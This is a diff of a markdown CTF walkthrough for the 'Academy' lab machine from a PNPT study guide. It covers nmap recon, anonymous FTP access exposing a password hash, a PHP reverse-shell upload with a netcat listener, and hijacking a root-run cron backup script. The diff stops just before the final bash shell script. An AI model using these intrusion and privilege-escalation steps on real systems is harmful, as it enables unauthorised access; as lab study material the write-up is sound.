@@ -1,6 +1,6 @@
 
 # Academy Walkthrough
-Treat these boxes as if it were a CTF
+Treat these boxes as if they were CTFs (not actual pen-tests).
 ## [Nmap](CLI-tools/linux/nmap.md) Recon
 ```bash
 sudo nmap -A -p- -T4 10.0.2.15
@@ -46,7 +46,7 @@ SSH on a CTF is normally treated differently than on an actual pentest. On a pen
 ### Port 80
 Has an Apache webserver running. If we visit the address `http://<target IP>:80` in the browser, we'll see a default page for Apache 2. This could mean that *[PHP](coding/languages/PHP.md) is running the backend*. BTW, the default page *is considered a finding*, because it's disclosing architecture when it doesn't need to be.
 ### Port 21 ([FTP](networking/protocols/FTP.md))
-We can use the [ftp-command](CLI-tools/linux/ftp-command.md) to check the FTP service on the target. Let's attempt to login to the service using `anonymous` user.
+We can use the [ftp command](CLI-tools/linux/ftp-command.md) to check the FTP service on the target. Let's attempt to login to the service using `anonymous` user.
 ```bash
 ftp 10.0.2.15
 Connected to 10.0.2.15.    
@@ -59,7 +59,9 @@ Remote system type is UNIX.
 Using binary mode to transfer files.  
 ftp>        # <------- ftp shell
 ```
-We can also use `ftp anonymous@<target IP>` and a blank password. If we type `ls` in the prompt, we can see a `note.txt`:
+We can also use `ftp anonymous@<target IP>` and a blank password.
+
+If we type `ls` in the prompt, we can see a `note.txt`:
 ```bash
 ftp> ls              
 229 Entering Extended Passive Mode (|||22266|) 
@@ -106,7 +108,7 @@ Here is what we've learned from this note:
 ### SQL:
 There is an [SQL](coding/languages/SQL.md) database storing information about users, including their passwords. Specifically, this table `students` stores student info.
 ### Run Ham
-There is a student named 'Run Ham' whose password is `cd73502828457d15655bbd7a63fb0bc8` and ID number (for login) is 777777 for some login called 'academy'. There's a chance this student hasn't had a chance to *change their default password yet.*
+There is a student named 'Run Ham' whose password is `cd73502828457d15655bbd7a63fb0bc8` and ID number (for login) is 777777 for some endpoint called 'academy'. There's a chance this student hasn't had a chance to *change their default password yet.*
 ### Grimmie
 Grimmie, whoever they are, *uses the same password everywhere*. We should keep them in mind b/c if we find their password, then we can likely use it multiple times to access other interfaces.
 ## Hashed Password
@@ -175,23 +177,29 @@ Once it's returned the results from that level, you can run it again to enumerat
 ## Logging in
 If we go to `http://10.0.2.15/academy` we get a login page where we can login with our new credentials.
 ![](nested-repos/PNPT-study-guide/PNPT-pics/academy-1.png)
+![](/PNPT-study-guide/PNPT-pics/academy-1.png)
 Once we're in, one of the interesting tabs we have access to is the `My Profile` tab. Clicking this, we find a form where we can upload a 'student photo'.
 ![](nested-repos/PNPT-study-guide/PNPT-pics/academy-2.png)
+![](/PNPT-study-guide/PNPT-pics/academy-2.png))
 Besides the photo upload, we can also pentest this for [SQL-injection](cybersecurity/TTPs/exploitation/injection/SQL-injection.md), etc.. However, the simplest place to start is to *use the form like its intended* and investigate from there.
 ## Student Photo Upload
 ### Plain Photo
 Starting w/ a plain photo, let's see what happens:
 ![](nested-repos/PNPT-study-guide/PNPT-pics/academy-3.png)
+![](/PNPT-study-guide/PNPT-pics/academy-3.png))
 We can see a green success message, as well as our new photo. If we investigate the source, we might be able to figure out where the photo is being loaded from in the HTML:
 ![](nested-repos/PNPT-study-guide/PNPT-pics/academy-4.png)
+![](/PNPT-study-guide/PNPT-pics/academy-4.png))
 The endpoint for the photo is `studentphoto/duck.jpeg`. Let's try to go to that endpoint w/ the browser:
 ![](nested-repos/PNPT-study-guide/PNPT-pics/academy-5.png)
+![](/PNPT-study-guide/PNPT-pics/academy-5.png)
 The fact that we can see our duck in the browser means *the webserver is executing the file*, so we know if we upload some code *it will be executed*.
 ### Reverse Shell
 Knowing that this is an Apache server, we can assume that PHP is running the backend. Additionally, we can see that php files are being referenced in the URLs.
 
-PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copu and paste the code, change the hostname and port values, and make sure [netcat](cybersecurity/tools/netcat.md) is listening on the port.
+PHP *executes on the server*, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](cybersecurity/tools/netcat.md) is listening on the port.
 ```bash
+nc -lvnp 44444
 listening on [any] 44444 ...
 connect to [10.0.2.4] from (UNKNOWN) [10.0.2.15] 51562
 Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
@@ -245,22 +253,35 @@ This file is removing a backup file, zipping a new one from the `.../html/academ
 
 Since this is a backup file *it's likely that it's being backed up on a scheduled interval* by this script. And since the script is able to set root permissions on it, it's likely the scrip is *being executed as root*. 
 
-Theoretically, if we can swap this script out with our own, we can execute code as toot. *But first* we need to make sure it actually is being executed on a schedule.
+Theoretically, if we can swap this script out with our own, we can execute code as root. *But first* we need to make sure it actually is being executed on a schedule.
 ### Automated scripts/ jobs
 There are a few things we can check to make sure this script is being executed regularly. The first, and least invasive is simply to check the last time the `/tmp/backup.zip` file was edited:
 ```bash
 ls -al /tmp/backup.zip
 -rwx------  1 root    root          2222 Oct  6 20:50 backup.zip 
 ```
-Being that it's currently 20:51 when this command was run, we can see that `backup.zip` was recently accessed (w/i the last 5 minutes). We can either wait around to check again and see if we catch the next execution, or try a few other ways to check.
+Being that it's currently 20:51 when this command was run, we can see that `backup.zip` was recently accessed (w/i the last minute). We can either wait around to check again and see if we catch the next execution, or try a few other ways to check.
 ### [crontab](CLI-tools/linux/crontab.md)
-crontab is a Linux tool which allows you to interface w/ [cron](computers/linux/linux-processes.md). Cron is a service which automates linux processes/ commands on an interval. If this backup.sh script is being ran on an interval, we might find a reference to it in cron.
+crontab is a Linux tool which allows you to interface w/ [cron](computers/linux/linux-processes.md). Cron is a service which automates linux processes/ commands on an interval. If this `backup.sh` script is being ran on an interval, we might find a 'cronjob' for it.
 
 Run `crontab -l` to see all the cron jobs associated w/ the current user (grimmie). Unfortunately, there are none. 
 #### Systemd
 Next we can check if there are any 'timers' w/ [systemd](computers/linux/linux-processes.md). Systemd is the service manager for linux and can be used to start and stop processes, etc.. To interact w/ systemd we use the `systemctl` command.
 
-To list all of the systemctl timers, we use the command `systemctl list-timers`. There are some timers, but none seem to be related to our backup file.
+To list all of the systemctl timers, we use the command `systemctl list-timers`.
+```bash
+grimmie@academy:~$ systemctl list-timers
+NEXT                         LEFT         LAST                         PASSED       UNIT           
+Sat 2023-10-07 14:39:00 EDT  1min 1s left Sat 2023-10-07 14:09:01 EDT  28min ago    phpsessionclean
+Sun 2023-10-08 00:00:00 EDT  9h left      Sat 2023-10-07 00:00:01 EDT  14h ago      logrotate.timer
+Sun 2023-10-08 00:00:00 EDT  9h left      Sat 2023-10-07 00:00:01 EDT  14h ago      man-db.timer   
+Sun 2023-10-08 04:45:10 EDT  14h left     Sat 2023-10-07 08:00:01 EDT  6h ago       apt-daily.timer
+Sun 2023-10-08 06:06:18 EDT  15h left     Sat 2023-10-07 06:58:01 EDT  7h ago       apt-daily-upgra
+Sun 2023-10-08 11:56:02 EDT  21h left     Sat 2023-10-07 09:10:01 EDT  5h 27min ago systemd-tmpfile
+
+6 timers listed.
+```
+There are some timers, but none seem to be related to our backup file.
 #### psypy
 [psypy](/cybersecurity/tools/actions-on-objective/psypy.md) is a tool developed by DominicBreuker on GitHub. It allows us to monitor linux processes *without root permissions* w/ live updates. Other linux tools like `top`, `lsof`, and `ps aux` can also be used.
 ##### Usage
@@ -277,7 +298,7 @@ Once it's served, we can `cd` into `/tmp` where `backup.zip` is and use `wget` t
 ```
 Scanning the output, we can see that `backup.sh` is being ran every minute.
 ### 2nd RevShell
-Now that we've verified that `backup.sh` is being executed, we can manipulated that to get another shell, but this time *with root permission and access*.
+Now that we've verified that `backup.sh` is being executed, we can manipulate that to get another shell, but this time *with root permissions and access*.
 #### Our bash script:
 A simple script to achieve a shell using [bash](coding/languages/bash.md) is the following:
 ```bash
